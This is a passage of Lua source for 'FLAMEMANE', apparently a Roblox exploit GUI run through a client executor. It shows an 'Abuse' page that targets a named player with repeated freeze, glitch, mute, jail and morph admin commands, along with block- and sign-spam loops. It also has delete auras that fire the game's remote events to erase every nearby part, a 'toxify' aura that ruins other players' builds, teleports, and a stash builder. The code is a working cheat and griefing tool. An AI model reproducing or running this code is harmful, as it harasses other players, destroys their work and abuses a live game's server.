local function runAbuseCycle(targetName)
    local enli=getEnlighten()
    if enli and enli.Parent~=LocalPlayer.Character then enli.Parent=LocalPlayer.Character; task.wait(0.15) end
    for _,cmd in ipairs(abuseCmds) do if not abuseActive then break end; pcall(function() cmd(targetName) end); task.wait(0.4) end
end

local abuseStatusLbl=createLabel(pgAbuse,"  Status: Inactive",Color3.fromRGB(116,113,117),11)

createToggle(pgAbuse,"💀  Abuse ON/OFF", function(v)
    abuseActive=v
    if v then
        local name=abuseBox.Text; if name=="" then print("[ABUSE] No target"); return end
        abuseStatusLbl.Text="  Status: Targeting "..name; abuseStatusLbl.TextColor3=C_ACCENT
        abuseThread=task.spawn(function()
            while abuseActive do
                local target=findPlayer(name)
                if target then runAbuseCycle(target.Name) end
                task.wait(abuseInterval)
            end
        end)
    else
        if abuseThread then task.cancel(abuseThread); abuseThread=nil end
        abuseStatusLbl.Text="  Status: Inactive"; abuseStatusLbl.TextColor3=Color3.fromRGB(116,113,117)
    end
end, CW, 42)

createDivider(pgAbuse)
createLabel(pgAbuse,"  Manual Commands",C_DIM,11)
local function mkAbuseBtn(txt, fn)
    createButton(pgAbuse,txt,function()
        local t=findPlayer(abuseBox.Text); if t then sendChat(fn..t.Name) end
    end, CW, 32)
end
mkAbuseBtn("🧊  Freeze",    ";freeze ")
mkAbuseBtn("🌀  Glitch",    ";glitch ")
mkAbuseBtn("🔇  Mute",      ";mute ")
mkAbuseBtn("⛓  Jail",      ";jail ")
mkAbuseBtn("👹  Morph (dont1play2with3me)", ";morph ")

createDivider(pgAbuse)
createButton(pgAbuse,"🔦  Check Arkenstone", function()
    local enli=getEnlighten()
    if enli then
        abuseStatusLbl.Text="  Status: Arkenstone ✓ in "..enli.Parent.Name; abuseStatusLbl.TextColor3=C_GREEN
    else
        abuseStatusLbl.Text="  Status: Arkenstone NOT found ✗"; abuseStatusLbl.TextColor3=Color3.fromRGB(255,80,80)
    end
end, CW, 34)

-- ============================================================
-- PAGE 11: AUTO BUILD  (from Extra Stuff Updated by 2AREYOUMENTAL110)
-- ============================================================
createLabel(pgAutoBuild,"  Auto Build (Extra Stuff Methods)",C_DIM,12)
createLabel(pgAutoBuild,"  from Extra Stuff Updated by 2AREYOUMENTAL110",C_ACCENT2,10)
createDivider(pgAutoBuild)

-- Helper: equip build tool
local function equipTool(name)
    local char=LocalPlayer.Character; if not char then return nil end
    local tool=char:FindFirstChild(name) or LocalPlayer.Backpack:FindFirstChild(name)
    if not tool then return nil end
    if tool.Parent~=char then tool.Parent=char; task.wait(0.05) end
    return char:FindFirstChild(name)
end
local function fireBuild(tool, parent, side, pos, style)
    if not tool then return end
    local ev=tool:FindFirstChild("origevent")
    if ev then pcall(function() ev:Invoke(parent,side,pos,style) end)
    else pcall(function() tool.Script.Event:FireServer(parent,side,pos,style) end) end
end
local function fireSign(tool, parent, side, pos, msg)
    if not tool then return end
    local ev=tool:FindFirstChild("origevent")
    if ev then pcall(function() ev:Invoke(parent,side,pos,msg) end)
    else pcall(function() tool.Script.Event:FireServer(parent,side,pos,msg) end) end
end

-- Spam Blocks at position
local spamBlocksActive=false
createToggle(pgAutoBuild,"🧱  Spam Blocks at Your Position", function(v)
    spamBlocksActive=v
    if v then task.spawn(function()
        while spamBlocksActive do
            task.wait(0.1)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local tool=equipTool("Build"); if not tool then continue end
            fireBuild(tool,workspace.Terrain,Enum.NormalId.Top,hrp.Position-Vector3.new(0,1.5,0),"normal")
        end
    end) end
end, CW)

-- Spam Signs at position
local spamSignsActive=false
createToggle(pgAutoBuild,"🪧  Spam Signs at Your Position", function(v)
    spamSignsActive=v
    if v then task.spawn(function()
        while spamSignsActive do
            task.wait(0.1)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local tool=equipTool("Sign"); if not tool then continue end
            fireSign(tool,workspace.Terrain,Enum.NormalId.Top,hrp.Position-Vector3.new(0,1.5,0),"")
        end
    end) end
end, CW)

createDivider(pgAutoBuild)
createLabel(pgAutoBuild,"  Build/Delete Aura (Extra Stuff methods)",C_DIM,11)

-- Build aura with range
local esBuildAuraActive=false; local esBuildRange=20
createLabel(pgAutoBuild,"  Build Aura Range (studs)",C_DIM,10)
local esBuildRangeBox=createTextBox(pgAutoBuild,"20",CW,28)
esBuildRangeBox.ClearTextOnFocus=false
esBuildRangeBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n=tonumber(esBuildRangeBox.Text); if n and n>0 then esBuildRange=n end
end)
createToggle(pgAutoBuild,"🌐  Build Aura (random offsets)", function(v)
    esBuildAuraActive=v
    if v then task.spawn(function()
        while esBuildAuraActive do
            task.wait(0.1)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local tool=equipTool("Build"); if not tool then continue end
            local r=esBuildRange
            local off=Vector3.new(math.random(-r,r),math.random(-r,r),math.random(-r,r))
            fireBuild(tool,workspace.Terrain,Enum.NormalId.Top,hrp.Position+off,"normal")
        end
    end) end
end, CW, 34)

-- Delete Aura (Extra Stuff standard)
local esDeleteAuraActive=false; local esDeleteRange=35
createLabel(pgAutoBuild,"  Delete Aura Range (studs)",C_DIM,10)
local esDeleteRangeBox=createTextBox(pgAutoBuild,"35",CW,28)
esDeleteRangeBox.ClearTextOnFocus=false
esDeleteRangeBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n=tonumber(esDeleteRangeBox.Text); if n and n>0 then esDeleteRange=n end
end)
createToggle(pgAutoBuild,"🗑  Delete Aura (Extra Stuff standard)", function(v)
    esDeleteAuraActive=v
    if v then task.spawn(function()
        while esDeleteAuraActive do
            task.wait(0.05)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local del=char:FindFirstChild("Delete") or LocalPlayer.Backpack:FindFirstChild("Delete")
            if del then
                if del.Parent~=char then del.Parent=char; task.wait(0.02) end
                del=char:FindFirstChild("Delete")
            end
            if del then
                for _,f in ipairs({"Bricks","Build","Placed","Blocks","UserBricks"}) do
                    local fl=workspace:FindFirstChild(f)
                    if fl then
                        for _,v in ipairs(fl:GetDescendants()) do
                            if v:IsA("BasePart") and (v.Position-hrp.Position).Magnitude<esDeleteRange then
                                coroutine.wrap(function()
                                    local ev=del:FindFirstChild("origevent")
                                    if ev then pcall(function() ev:Invoke(v,v.Position) end)
                                    else pcall(function() del.Script.Event:FireServer(v,v.Position) end) end
                                end)()
                            end
                        end
                    end
                end
            end
        end
    end) end
end, CW, 34)

-- Delete Aura (Extra Stuff Solara)
local esDeleteAuraSolActive=false
createToggle(pgAutoBuild,"🗑  Delete Aura (Extra Stuff solara)", function(v)
    esDeleteAuraSolActive=v
    if v then task.spawn(function()
        while esDeleteAuraSolActive do
            task.wait(0.05)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local del=char:FindFirstChild("Delete") or LocalPlayer.Backpack:FindFirstChild("Delete")
            if del and del.Parent~=char then del.Parent=char; task.wait(0.02) end
            del=char:FindFirstChild("Delete"); if not del then continue end
            for _,v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and (v.Position-hrp.Position).Magnitude<esDeleteRange then
                    coroutine.wrap(function()
                        local ev=del:FindFirstChild("origevent")
                        if ev then pcall(function() ev:Invoke(v,v.Position) end)
                        else pcall(function() del.Script.Event:FireServer(v,v.Position) end) end
                    end)()
                end
            end
        end
    end) end
end, CW, 34)

createDivider(pgAutoBuild)
createLabel(pgAutoBuild,"  Selected Block Spam (Extra Stuff method)",C_DIM,11)

-- Select a block then spam build on it
local esSelectedBlock=nil; local esSelectedSide=Enum.NormalId.Top; local esSpamSelectedActive=false

createButton(pgAutoBuild,"🖱  Select Block (click in world)", function()
    local function onInput(input, gpe)
        if gpe then return end
        if input.UserInputType==Enum.UserInputType.MouseButton1 then
            local ray=workspace.CurrentCamera:ScreenPointToRay(input.Position.X,input.Position.Y)
            local params=RaycastParams.new(); params.FilterType=Enum.RaycastFilterType.Exclude
            local chars={}; for _,p in ipairs(Players:GetPlayers()) do if p.Character then table.insert(chars,p.Character) end end
            params.FilterDescendantsInstances=chars
            local result=workspace:Raycast(ray.Origin,ray.Direction*500,params)
            if result and result.Instance and result.Instance:IsA("BasePart") then
                esSelectedBlock=result.Instance
                print("[AUTO BUILD] Selected: "..result.Instance:GetFullName())
            end
        end
    end
    local conn; conn=UserInputService.InputBegan:Connect(function(i,gpe)
        if i.UserInputType==Enum.UserInputType.MouseButton1 then
            onInput(i,gpe); conn:Disconnect()
        end
    end)
end, CW, 34)

local sides={"Right","Top","Back","Left","Bottom","Front"}
createLabel(pgAutoBuild,"  Side to build on",C_DIM,10)
for _,sideName in ipairs(sides) do
    local b = Instance.new("TextButton", pgAutoBuild)
    b.Size=UDim2.fromOffset(54,24); b.BackgroundColor3=C_BG3; b.Text=sideName
    b.Font=Enum.Font.GothamBold; b.TextSize=9; b.TextColor3=C_DIM
    b.BorderSizePixel=0; b.AutoButtonColor=false
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)
    b.MouseButton1Click:Connect(function()
        esSelectedSide=Enum.NormalId[sideName]
        b.BackgroundColor3=C_ACCENT; b.TextColor3=C_WHITE
        task.wait(0.2); b.BackgroundColor3=C_BG3; b.TextColor3=C_DIM
    end)
end

createToggle(pgAutoBuild,"🔁  Spam Selected Block Side", function(v)
    esSpamSelectedActive=v
    if v then task.spawn(function()
        while esSpamSelectedActive do
            task.wait(0.05)
            if not esSelectedBlock or not esSelectedBlock.Parent then continue end
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local tool=equipTool("Build"); if not tool then continue end
            fireBuild(tool,esSelectedBlock,esSelectedSide,hrp.Position-Vector3.new(0,1.5,0),"normal")
        end
    end) end
end, CW, 34)

-- Toxify Aura (Extra Stuff method)
createDivider(pgAutoBuild)
createLabel(pgAutoBuild,"  Toxify Aura (Extra Stuff method)",C_DIM,11)
local toxifyAuraActive=false
createToggle(pgAutoBuild,"☠  Toxify Build Aura", function(v)
    toxifyAuraActive=v
    if v then task.spawn(function()
        while toxifyAuraActive do
            task.wait(0.15)
            local char=LocalPlayer.Character; if not char then continue end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then continue end
            local remote,rootPos=getPaintRemote()
            if not remote then continue end
            local key="both \u{1F91D}"
            -- Find any nearby placed brick and toxify it
            for _,fname in ipairs({"Bricks","Build","Placed","Blocks"}) do
                local fl=workspace:FindFirstChild(fname); if not fl then continue end
                for _,v in ipairs(fl:GetDescendants()) do
                    if v:IsA("BasePart") and (v.Position-hrp.Position).Magnitude<40 then
                        pcall(function()
                            remote:FireServer(v,Enum.NormalId.Top,rootPos,key,Color3.new(0,0,0),"toxic","anchor")
                        end)
                        task.wait(0.05)
                    end
                end
            end
        end
    end) end
end, CW, 34)

-- ============================================================
-- PAGE 12: SAVE ENLI
-- ============================================================
createLabel(pgSaveEnli,"  Save Arkenstone",C_DIM,12)
createLabel(pgSaveEnli,"  Clones you to save your Arkenstone",C_ACCENT2,10)
createDivider(pgSaveEnli)

local enliStatusLbl=createLabel(pgSaveEnli,"  Arkenstone: Not checked",Color3.fromRGB(116,113,117),11)
local function getEnlightenTool()
    local char=LocalPlayer.Character
    return (char and char:FindFirstChild("The Arkenstone")) or LocalPlayer.Backpack:FindFirstChild("The Arkenstone")
end
local function setEnliStatus(txt,col)
    enliStatusLbl.Text="  Arkenstone: "..txt; enliStatusLbl.TextColor3=col or Color3.fromRGB(116,113,117)
end

createButton(pgSaveEnli,"🔦  Check Arkenstone", function()
    local enli=getEnlightenTool()
    if enli then setEnliStatus((enli.Parent==LocalPlayer.Character and "Equipped ✓" or "In Backpack"),C_GREEN)
    else setEnliStatus("NOT FOUND ✗",Color3.fromRGB(255,60,60)) end
end, CW, 36)

createDivider(pgSaveEnli)

local function doSaveEnlighten()
    local enli=getEnlightenTool()
    if not enli then setEnliStatus("NOT FOUND — equip first! ✗",Color3.fromRGB(255,60,60)); return false end
    if enli.Parent~=LocalPlayer.Character then enli.Parent=LocalPlayer.Character; task.wait(0.2) end
    setEnliStatus("Cloning...",C_GREEN)
    sendChat(";clone me"); task.wait(2)
    sendChat(";gear me 25162389")
    setEnliStatus("Done ✓ (clone → bucket)",C_GREEN); return true
end

createButton(pgSaveEnli,"💡  SAVE ENLIGHTEN", function() task.spawn(doSaveEnlighten) end, CW, 48)
createDivider(pgSaveEnli)

local autoSaveEnliActive=false; local autoSaveThread=nil
createToggle(pgSaveEnli,"🔄  Auto Save Arkenstone (every 30s)", function(v)
    autoSaveEnliActive=v
    if v then
        autoSaveThread=task.spawn(function() while autoSaveEnliActive do doSaveEnlighten(); task.wait(30) end end)
    else
        if autoSaveThread then task.cancel(autoSaveThread); autoSaveThread=nil end
        setEnliStatus("Auto save stopped",Color3.fromRGB(116,113,117))
    end
end, CW, 40)

createDivider(pgSaveEnli)
createLabel(pgSaveEnli,"  Enlighten Stash",C_DIM,12)

local STASH_DATA = {
    {a=true,p={-1015.5,12.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,11.5,-82.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1021.5,11.5,-87.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1021.5,15.5,-93.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,20.5,-100.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,25.5,-106.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1020.5,25.5,-107.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1015.5,12.5,-82.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1015.5,13.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={-1014.5,12.5,-83.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={903.5,132.5,713.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={1192.5,106.5,869.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={1204.5,109.5,873.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={10204.5,1984.5,2431.5},c={192,192,192},s={1,1,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2447.5,2542.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12007.5,2447.5,2542.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2447.5,2556.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12007.5,2447.5,2556.5},c={192,192,192},s={12,1,14},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11995.5,2448.5,2542.5},c={192,192,192},s={1,8,28},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={12018.5,2448.5,2542.5},c={192,192,192},s={1,8,28},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11996.5,2448.5,2569.5},c={192,192,192},s={22,8,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11996.5,2448.5,2542.5},c={192,192,192},s={22,8,1},m="plastic",sp={},o="Plastic",cc=true},
    {a=true,p={11981.5,2455.5,2542.5},c={192,192,192},s={14,1,28},m="plastic",sp={},o="Plastic",cc=true},
}
local STASH_TP = Vector3.new(12007,2455,2556)
local stashBuilding=false; local stashBuildWait=0.15

local stashStatusLbl=createLabel(pgSaveEnli,"  Stash: Idle",Color3.fromRGB(116,113,117),11)

createLabel(pgSaveEnli,"  Build Delay (seconds, type a number)",C_DIM,10)
local stashDelayBox=createTextBox(pgSaveEnli,"0.15",CW,28)
stashDelayBox.ClearTextOnFocus=false
stashDelayBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n=tonumber(stashDelayBox.Text); if n and n>0 then stashBuildWait=n end
end)

createButton(pgSaveEnli,"🏗  BUILD STASH", function()
    if stashBuilding then return end
    task.spawn(function()
        stashBuilding=true
        stashStatusLbl.Text="  Stash: Building..."; stashStatusLbl.TextColor3=C_ACCENT2
        local function equipBuild()
            local char=LocalPlayer.Character; if not char then return nil end
            local tool=char:FindFirstChild("Build") or LocalPlayer.Backpack:FindFirstChild("Build"); if not tool then return nil end
            if tool.Parent~=char then tool.Parent=char; task.wait(0.1) end
            return char:FindFirstChild("Build")
        end
        local et=equipBuild()
        if not et then stashStatusLbl.Text="  Stash: No Build tool!"; stashStatusLbl.TextColor3=Color3.fromRGB(255,60,60); stashBuilding=false; return end
        for i,v in ipairs(STASH_DATA) do
            et=equipBuild(); if not et then break end
            local pos=Vector3.new(v.p[1],v.p[2],v.p[3])
            pcall(function()
                local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then hrp.CFrame=CFrame.new(pos+Vector3.new(0,6,0)) end
            end)
            pcall(function()
                local ev=et:FindFirstChild("origevent")
                if ev then ev:Invoke(workspace.Terrain,Enum.NormalId.Top,pos,"detailed")
                else et.Script.Event:FireServer(workspace.Terrain,Enum.NormalId.Top,pos,"detailed") end
            end)
            stashStatusLbl.Text="  Stash: "..i.."/"..#STASH_DATA
            task.wait(stashBuildWait)
        end
        stashBuilding=false
        stashStatusLbl.Text="  Stash: Done ✓"; stashStatusLbl.TextColor3=C_GREEN
    end)
end, CW, 44)

createButton(pgSaveEnli,"📍  TP TO STASH", function()
    local hrp=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame=CFrame.new(STASH_TP); stashStatusLbl.Text="  Stash: Teleported ✓"; stashStatusLbl.TextColor3=C_GREEN end
end, CW, 38)

-- ============================================================
-- PAGE 13: CREDITS
-- ============================================================
local credLbl=Instance.new("TextLabel",pgCredits)
credLbl.Size=UDim2.fromOffset(CW,300); credLbl.BackgroundTransparency=1
credLbl.Text="🔥  FLAMEMANE\n\ncredit to stik for ui\nand the nuker script\n\ncredits to kii akira\nfor the god mode code\n\nAuto Build from\n2AREYOUMENTAL110\n\nVPLI Anti methods from\nthe VPLI HUB source"
credLbl.Font=Enum.Font.GothamBold; credLbl.TextSize=16
credLbl.TextColor3=C_DIM; credLbl.TextWrapped=true
credLbl.TextXAlignment=Enum.TextXAlignment.Center
credLbl.TextYAlignment=Enum.TextYAlignment.Top

-- ============================================================
-- INIT
-- ============================================================
switchTab(1)
print("[FLAMEMANE] Loaded! Click tabs to switch | 🔥 = show/hide")
